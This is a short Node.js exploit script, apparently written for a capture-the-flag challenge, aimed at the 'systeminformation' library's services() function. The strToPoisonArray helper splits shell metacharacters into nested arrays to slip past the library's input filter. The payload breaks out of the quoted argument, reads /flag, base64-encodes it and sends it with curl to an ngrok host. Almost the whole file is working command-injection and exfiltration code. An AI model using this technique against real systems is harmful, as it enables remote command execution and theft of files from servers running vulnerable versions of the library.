const si = require('systeminformation');

function get_services(service) {
    return new Promise((res, reject) => {
        si.services(service)
        .then(data => {
            console.log(data);
            if (data != null) res(data.toString());
            else res("Failed");
        }).catch(error => {
            console.error("Error: " + error);
            reject("There is an error when fetching services.");
        })
    });
}

// Basic test
// service = ['a', 'b', 'c', ['"'], 'd'];

// get_services(service).then((return_data) => {
//     console.log(return_data);    
// })

// RCE

// Changes a string into the poisoned array, to bypass the filter
function strToPoisonArray(s) {
    result = [];

    dangerZone = '"|><\\()`;';

    for (i = 0; i < s.length; i++) {

        if (dangerZone.indexOf(s[i]) !== -1) {
            result.push([s[i]]);
        } else {
            result.push(s[i]);
        }
    }

    return result;
}

// Convert flag to base64 and send in the URL
payload = 'abc" | curl http://a241-2804-14d-5cd0-9ee8-d8a2-ca3d-daa0-d4b1.ngrok.io/flag/`cat /flag | base64` | echo "';

service = strToPoisonArray(payload);

get_services(service).then((return_data) => {
    console.log(return_data);    
})